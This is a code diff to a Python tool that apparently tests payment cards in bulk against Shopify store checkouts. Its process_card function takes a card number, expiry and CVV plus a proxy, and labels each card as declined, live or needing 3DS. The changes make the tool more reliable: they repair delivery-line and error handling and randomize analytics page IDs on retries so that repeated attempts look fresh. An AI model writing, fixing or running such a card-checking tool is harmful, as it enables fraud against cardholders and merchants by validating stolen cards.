@@ -247,7 +247,7 @@ MUTATION_CART_CREATE = """mutation cartCreate($input:CartInput!){result:cartCrea
 #   - Added merchandise{__typename} inside merchandiseLines for debugging
 #   - Removed tax sub-fields (tax comes from sellerProposal.totalAmount or via TAX_NEW_TAX_MUST_BE_ACCEPTED)
 #   - Uses the exact format confirmed working on allbirds.com
-QUERY_PROPOSAL = """query Proposal($input:SessionNegotiationInput!){session{negotiate(input:$input){errors{code localizedMessage}result{__typename ...on NegotiationResultAvailable{queueToken sessionToken sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}...on MoneyIntervalConstraint{lowerBound{amount currencyCode}upperBound{amount currencyCode}}}isShippingRequired delivery{__typename ...on PendingTerms{pollDelay taskId}...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}...on PartialStreetAddress{address1 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}...on FilledMerchandiseLineTargetCollection{linesV2{__typename}}}}}}merchandise{__typename ...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{__typename ...on SourceProvidedMerchandise{variantId price{amount currencyCode}title requiresShipping taxable giftCard}}}}}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name brands}}}}}}buyerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}}...on NegotiationResultFailed{failureCode}...on SubmittedForCompletion{receipt{__typename ...on FailedReceipt{processingError{__typename}}}}...on CheckpointDenied{__typename}...on Throttled{__typename}}}}}"""
+QUERY_PROPOSAL = """query Proposal($input:SessionNegotiationInput!){session{negotiate(input:$input){errors{code localizedMessage}result{__typename ...on NegotiationResultAvailable{queueToken sessionToken sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}...on MoneyIntervalConstraint{lowerBound{amount currencyCode}upperBound{amount currencyCode}}}isShippingRequired delivery{__typename ...on PendingTerms{pollDelay taskId}...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}...on PartialStreetAddress{address1 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}...on FilledMerchandiseLineTargetCollection{linesV2{__typename stableId}}}}}}merchandise{__typename ...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{__typename ...on SourceProvidedMerchandise{variantId price{amount currencyCode}title requiresShipping taxable giftCard}}}}}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name brands}}}}}}buyerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}}...on NegotiationResultFailed{failureCode}...on SubmittedForCompletion{receipt{__typename ...on FailedReceipt{processingError{__typename}}}}...on CheckpointDenied{__typename}...on Throttled{__typename}}}}}"""
 
 # --- Checkout Web API: SubmitForCompletion ---
 # CRITICAL: submitForCompletion returns SubmitForCompletionResult UNION directly
@@ -264,7 +264,7 @@ MUTATION_SUBMIT = (
     "{...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{order{id}}...on FailedReceipt{__typename}...on ActionRequiredReceipt{__typename}}configurationRecordId}"
     "...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{order{id}}...on FailedReceipt{__typename}...on ActionRequiredReceipt{__typename}}configurationRecordId}"
     "...on SubmitFailed{reason}"
-    "...on SubmitRejected{errors{code localizedMessage}sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}}}}}}}"
+    "...on SubmitRejected{errors{code localizedMessage}sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes stableId selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle code title amount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}}...on CustomDeliveryStrategy{code title price{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}...on DeliveryStrategyReference{handle}}totalAmount{__typename ...on MoneyValueConstraint{value{amount currencyCode}}...on AnyConstraint{any:_singleInstance}}destinationAddress{__typename ...on StreetAddress{address1 address2 city countryCode zoneCode postalCode}}targetMerchandise{__typename ...on AnyMerchandiseLineTargetCollection{any}...on FilledMerchandiseLineTargetCollection{linesV2{__typename stableId}}}}}}}"
     "...on CheckpointDenied{__typename}"
     "...on Throttled{__typename}"
     "...on TooManyAttempts{__typename}"
@@ -430,6 +430,22 @@ def _extract_payment_error_response(error, _depth=0):
         return message
 
     return generic_code or message or 'UNKNOWN_PAYMENT_ERROR'
+
+
+def _payment_requires_offsite_action(error):
+    """Return True if the payment error indicates an off-site redirect / 3DS challenge.
+
+    Shopify's PurchaseOrderProcessingError carries two boolean flags:
+        - hasOffsiteRedirect       (older / Stripe-style 3DS redirect)
+        - hasOffsitePaymentMethod  (newer wallet / off-site payment methods)
+
+    Either being truthy means the cardholder must complete authentication
+    off-site (3DS, OTP, wallet approval, etc.) — the payment has NOT been
+    declined, so we report "3DS_REQUIRED" rather than "CARD_DECLINED".
+    """
+    if not isinstance(error, dict):
+        return False
+    return bool(error.get('hasOffsiteRedirect') or error.get('hasOffsitePaymentMethod'))
 
 
 def extract_clean_response(message):
@@ -833,12 +849,12 @@ def _parse_negotiate_response(resp_json):
                 _dest_typename = server_dest_addr.get('__typename', '') if server_dest_addr else ''
                 
                 # Extract address fields from StreetAddress or PartialStreetAddress
-                server_street1 = server_dest_addr.get('address1', '')
-                server_street2 = server_dest_addr.get('address2', '')
-                server_city = server_dest_addr.get('city', '')
-                server_country = server_dest_addr.get('countryCode', '')
-                server_zone = server_dest_addr.get('zoneCode', '')
-                server_postal = server_dest_addr.get('postalCode', '')
+                server_street1 = server_dest_addr.get('address1') or ''
+                server_street2 = server_dest_addr.get('address2') or ''
+                server_city = server_dest_addr.get('city') or ''
+                server_country = server_dest_addr.get('countryCode') or ''
+                server_zone = server_dest_addr.get('zoneCode') or ''
+                server_postal = server_dest_addr.get('postalCode') or ''
                 
                 # ─── targetMerchandise (MerchandiseLineTargetCollection UNION) ───
                 # Response: AnyMerchandiseLineTargetCollection | FilledMerchandiseLineTargetCollection
@@ -892,13 +908,20 @@ def _parse_negotiate_response(resp_json):
                 if _target_typename == 'AnyMerchandiseLineTargetCollection' or (server_target_merch and server_target_merch.get('any')):
                     server_dl['targetMerchandiseLines'] = {'any': True}
                 elif _target_typename == 'FilledMerchandiseLineTargetCollection':
-                    # FilledMerchandiseLineTargetCollection has linesV2
+                    # FilledMerchandiseLineTargetCollection has linesV2.
+                    # Each entry should have a stableId (requested in QUERY_PROPOSAL).
+                    # If linesV2 is missing/empty OR entries lack stableId, fall back to
+                    # {any: True} — NEVER produce {lines: []} which the server rejects
+                    # with DELIVERY_DELIVERY_LINE_DETAIL_CHANGED.
                     _lines_v2 = server_target_merch.get('linesV2', [])
-                    if _lines_v2:
+                    _target_stable_ids = [l.get('stableId') for l in _lines_v2 if l.get('stableId')]
+                    if _target_stable_ids:
                         server_dl['targetMerchandiseLines'] = {
-                            'lines': [{'stableId': l.get('stableId', '')} for l in _lines_v2 if l.get('stableId')]
+                            'lines': [{'stableId': sid} for sid in _target_stable_ids]
                         }
                     else:
+                        # No stableId available — use {any: True} which is semantically
+                        # equivalent to "all merchandise lines targeted".
                         server_dl['targetMerchandiseLines'] = {'any': True}
                 else:
                     server_dl['targetMerchandiseLines'] = {'any': True}
@@ -2841,7 +2864,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         # SubmitRejected — may or may not have __typename
                         # If we have blocking errors, treat as rejection
                         if _blocking_errors:
-                            rej_msgs = [e.get('code', '') or e.get('localizedMessage', str(e)) for e in _blocking_errors[:3]]
+                            # Format: "CODE:message" so the real error code is preserved
+                            # through extract_clean_response() instead of being stripped to
+                            # just "SUBMIT_REJECTED". This makes the user-facing response
+                            # actually useful for debugging.
+                            rej_msgs = []
+                            for e in _blocking_errors[:3]:
+                                _code = e.get('code', '') or (e.get('extensions') or {}).get('code', '') or 'UNKNOWN'
+                                _msg = e.get('localizedMessage') or e.get('message', '')
+                                _msg = (_msg[:120] if isinstance(_msg, str) else str(_msg)[:120])
+                                rej_msgs.append(f"{_code}:{_msg}" if _msg else _code)
                             return False, f"SUBMIT_REJECTED: {'; '.join(rej_msgs)}", gateway, total_price, currency
                     elif _submit_result_type == 'CheckpointDenied':
                         return False, "CAPTCHA_BLOCK: CheckpointDenied on submit", gateway, total_price, currency
@@ -2927,10 +2959,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     if _rtm_type == 'AnyMerchandiseLineTargetCollection' or (_rtm and _rtm.get('any')):
                                         _rdl_entry['targetMerchandiseLines'] = {'any': True}
                                     elif _rtm_type == 'FilledMerchandiseLineTargetCollection':
+                                        # linesV2 is requested with stableId in MUTATION_SUBMIT.
+                                        # If stableId is missing/empty, fall back to {any: True}
+                                        # — NEVER produce {lines: []} (causes DELIVERY_DELIVERY_LINE_DETAIL_CHANGED).
                                         _lines_v2 = _rtm.get('linesV2', [])
-                                        if _lines_v2:
+                                        _rtm_stable_ids = [l.get('stableId') for l in _lines_v2 if l.get('stableId')]
+                                        if _rtm_stable_ids:
                                             _rdl_entry['targetMerchandiseLines'] = {
-                                                'lines': [{'stableId': l.get('stableId', '')} for l in _lines_v2 if l.get('stableId')]
+                                                'lines': [{'stableId': sid} for sid in _rtm_stable_ids]
                                             }
                                         else:
                                             _rdl_entry['targetMerchandiseLines'] = {'any': True}
@@ -2945,12 +2981,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                             'streetAddress': {
                                                 'firstName': '',
                                                 'lastName': '',
-                                                'address1': _rdest.get('address1', ''),
-                                                'address2': _rdest.get('address2', ''),
-                                                'city': _rdest.get('city', ''),
-                                                'countryCode': _rdest.get('countryCode', ''),
-                                                'zoneCode': _rdest.get('zoneCode', ''),
-                                                'postalCode': _rdest.get('postalCode', ''),
+                                                'address1': _rdest.get('address1') or '',
+                                                'address2': _rdest.get('address2') or '',
+                                                'city': _rdest.get('city') or '',
+                                                'countryCode': _rdest.get('countryCode') or '',
+                                                'zoneCode': _rdest.get('zoneCode') or '',
+                                                'postalCode': _rdest.get('postalCode') or '',
                                                 'phone': '',
                                             },
                                         }
@@ -2969,6 +3005,58 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     for _pl in pp['payment'].get('paymentLines', []):
                                         _pl['amount'] = {'value': {'amount': f'{total_price}', 'currencyCode': currency}}
                                     print(f'[SUBMIT_REJECTED] Updated total from sellerProposal: {total_price} {currency}', file=sys.stderr)
+                        
+                        # ─── PRE-RENEGOTIATION DELIVERY FIX ───
+                        # ROOT CAUSE: The original submit sent targetMerchandiseLines: {lines: []}
+                        # (empty list) which the server rejected with DELIVERY_DELIVERY_LINE_DETAIL_CHANGED.
+                        # The re-negotiation below must NOT reuse the same broken pp['delivery'] —
+                        # otherwise the server keeps returning the same warning and the retry submit
+                        # ends up with inconsistent state, causing INTERNAL_SERVER_ERROR.
+                        #
+                        # FIX: Build corrected delivery terms from the SubmitRejected sellerProposal
+                        # (which contains the EXACT delivery lines the server wants) and update
+                        # pp['delivery'] BEFORE the re-negotiation. This way the re-negotiation
+                        # sends the corrected delivery, the server updates its state, and the
+                        # retry submit succeeds.
+                        if is_shipping_required and _rejected_delivery_lines:
+                            _pre_dl_list = []
+                            for _pdl in _rejected_delivery_lines:
+                                _pfdl = dict(_pdl)
+                                if 'destination' not in _pfdl or not _pfdl.get('destination'):
+                                    _pfdl['destination'] = {
+                                        'streetAddress': {
+                                            'firstName': firstName,
+                                            'lastName': lastName,
+                                            'address1': street,
+                                            'address2': '',
+                                            'city': city,
+                                            'countryCode': country_code,
+                                            'zoneCode': state,
+                                            'postalCode': s_zip,
+                                            'phone': phone,
+                                        },
+                                    }
+                                else:
+                                    _pdest = _pfdl.get('destination') or {}
+                                    _psa = _pdest.get('streetAddress') or {}
+                                    if not _psa.get('firstName'): _psa['firstName'] = firstName
+                                    if not _psa.get('lastName'): _psa['lastName'] = lastName
+                                    if not _psa.get('address1'): _psa['address1'] = street
+                                    if _psa.get('address2') is None: _psa['address2'] = ''
+                                    if not _psa.get('city'): _psa['city'] = city
+                                    if not _psa.get('countryCode'): _psa['countryCode'] = country_code
+                                    if not _psa.get('zoneCode'): _psa['zoneCode'] = state
+                                    if not _psa.get('postalCode'): _psa['postalCode'] = s_zip
+                                    if not _psa.get('phone'): _psa['phone'] = phone
+                                    _pfdl['destination'] = {'streetAddress': _psa}
+                                _pre_dl_list.append(_pfdl)
+                            _pre_delivery_terms = _build_delivery_terms(
+                                delivery_lines=_pre_dl_list,
+                                no_delivery_required=[],
+                            )
+                            pp['delivery'] = _pre_delivery_terms
+                            submit_data['variables']['input']['delivery'] = _pre_delivery_terms
+                            print(f'[RENEG_PRE] Pre-applied corrected delivery from sellerProposal: {len(_pre_dl_list)} lines', file=sys.stderr)
                         
                         # Step A: Re-negotiate with current state
                         _reneg_data = {
@@ -3067,6 +3155,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                                 if not _sa.get('firstName'): _sa['firstName'] = firstName
                                                 if not _sa.get('lastName'): _sa['lastName'] = lastName
                                                 if not _sa.get('address1'): _sa['address1'] = street
+                                                if _sa.get('address2') is None: _sa['address2'] = ''
                                                 if not _sa.get('city'): _sa['city'] = city
                                                 if not _sa.get('countryCode'): _sa['countryCode'] = country_code
                                                 if not _sa.get('zoneCode'): _sa['zoneCode'] = state
@@ -3172,6 +3261,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                         # Update payment in submit data
                         submit_data['variables']['input']['payment'] = pp.get('payment')
+                        # Regenerate analytics.pageId so the retry is treated as a fresh request
+                        # (reusing the same pageId can cause Shopify backend state confusion).
+                        submit_data['variables']['analytics'] = {
+                            'requestUrl': checkout_url,
+                            'pageId': f'{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}',
+                        }
                         
                         _retry_resp, _ = await retry_on_429(
                             lambda: session.post(
@@ -3210,7 +3305,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     _rej_errs = _retry_result.get('errors', [])
                                     _rej_blocking = [e for e in _rej_errs if e.get('code', '') not in _NON_BLOCKING_CODES]
                                     if _rej_blocking:
-                                        rej_msgs = [e.get('code', '') or e.get('localizedMessage', str(e)) for e in _rej_blocking[:3]]
+                                        # Format: "CODE:message" so the real error code is preserved
+                                        rej_msgs = []
+                                        for e in _rej_blocking[:3]:
+                                            _code = e.get('code', '') or (e.get('extensions') or {}).get('code', '') or 'UNKNOWN'
+                                            _msg = e.get('localizedMessage') or e.get('message', '')
+                                            _msg = (_msg[:120] if isinstance(_msg, str) else str(_msg)[:120])
+                                            rej_msgs.append(f"{_code}:{_msg}" if _msg else _code)
                                         return False, f"SUBMIT_REJECTED: {'; '.join(rej_msgs)}", gateway, total_price, currency
                                     # Only non-blocking warnings — the submit may still have been
                                     # accepted. Try to extract receipt from the response.
@@ -3235,9 +3336,40 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     _retry_errors = _retry_json.get('errors', [])
                                     _retry_sfc_errors = _retry_result.get('errors', []) if _retry_result else []
                                     _all_retry_errors = _retry_errors + _retry_sfc_errors
-                                    _blocking = [e for e in _all_retry_errors if (e.get('extensions') or {}).get('code', '') not in ('INVALID_VARIABLE',) or 'MERCHANDISE_SIGNATURE' not in str(e)]
+                                    # Errors that should NOT be treated as a real SUBMIT_REJECTED:
+                                    #   - INVALID_VARIABLE        : schema validation warning, retry-able
+                                    #   - INTERNAL_SERVER_ERROR    : Shopify backend crashed (transient)
+                                    #   - INTERNAL_ERROR           : same, different code path
+                                    #   - *_NON_BLOCKING_CODES     : advisory warnings already filtered
+                                    #                                in the initial submit (e.g. MERCHANDISE_SIGNATURE_MISMATCH,
+                                    #                                DELIVERY_DELIVERY_LINE_DETAIL_CHANGED)
+                                    # The previous filter had a Python operator-precedence bug:
+                                    #   `code not in A and code not in B or 'MERCHANDISE_SIGNATURE' in str(e)`
+                                    # parsed as `(code not in A and code not in B) or ('MERCHANDISE_SIGNATURE' in str(e))`,
+                                    # which incorrectly marked MERCHANDISE_SIGNATURE_MISMATCH warnings as
+                                    # blocking — re-introducing the very bug _NON_BLOCKING_CODES was meant to fix.
+                                    # The fix below explicitly parenthesises so MERCHANDISE_SIGNATURE-* warnings
+                                    # are excluded from blocking errors.
+                                    _TRANSIENT_CODES = {'INTERNAL_SERVER_ERROR', 'INTERNAL_ERROR'}
+                                    _RETRY_IGNORE_CODES = ({'INVALID_VARIABLE'} | _TRANSIENT_CODES | _NON_BLOCKING_CODES)
+                                    _transient_errs = [e for e in _all_retry_errors
+                                                       if (e.get('extensions') or {}).get('code', '') in _TRANSIENT_CODES]
+                                    _blocking = []
+                                    for e in _all_retry_errors:
+                                        _ecode = (e.get('extensions') or {}).get('code', '') or e.get('code', '')
+                                        _e_str = str(e)
+                                        # Skip ignored codes
+                                        if _ecode in _RETRY_IGNORE_CODES:
+                                            continue
+                                        # Skip MERCHANDISE_SIGNATURE substring matches (non-blocking warning)
+                                        if 'MERCHANDISE_SIGNATURE' in _e_str:
+                                            continue
+                                        _blocking.append(e)
+                                    if _transient_errs:
+                                        _t_msgs = [f"{(e.get('extensions') or {}).get('code', '') or e.get('code', '')}:{e.get('message', str(e))[:120]}" for e in _transient_errs[:3]]
+                                        return False, f"SHOPIFY_SERVER_ERROR: {'; '.join(_t_msgs)}", gateway, total_price, currency
                                     if _blocking:
-                                        _blk_msgs = [e.get('message', str(e))[:80] for e in _blocking[:3]]
+                                        _blk_msgs = [f"{(e.get('extensions') or {}).get('code', '') or e.get('code', '') or 'UNKNOWN'}:{e.get('message', str(e))[:120]}" for e in _blocking[:3]]
                                         return False, f"SUBMIT_REJECTED: {'; '.join(_blk_msgs)}", gateway, total_price, currency
                             except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                                 print(f'[SUBMIT_RETRY] Parse error: {e}', file=sys.stderr)
@@ -3350,8 +3482,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _pe = _receipt.get('processingError') or {}
                 if _pe:
                     _ext = _extract_payment_error_response(_pe)
-                    _offsite = bool(_pe.get('hasOffsiteRedirect') or _pe.get('hasOffsitePaymentMethod'))
-                    if _offsite:
+                    if _payment_requires_offsite_action(_pe):
                         return True, "3DS_REQUIRED", gateway, total_price, currency
                     return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                 return False, "CARD_DECLINED", gateway, total_price, currency
@@ -3407,8 +3538,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if _pe:
                     _ext = _extract_payment_error_response(_pe)
                     if _ext and _ext != 'UNKNOWN_PAYMENT_ERROR':
-                        _offsite = bool(_pe.get('hasOffsiteRedirect') or _pe.get('hasOffsitePaymentMethod'))
-                        if _offsite:
+                        if _payment_requires_offsite_action(_pe):
                             return True, "3DS_REQUIRED", gateway, total_price, currency
                         return False, _ext, gateway, total_price, currency
 
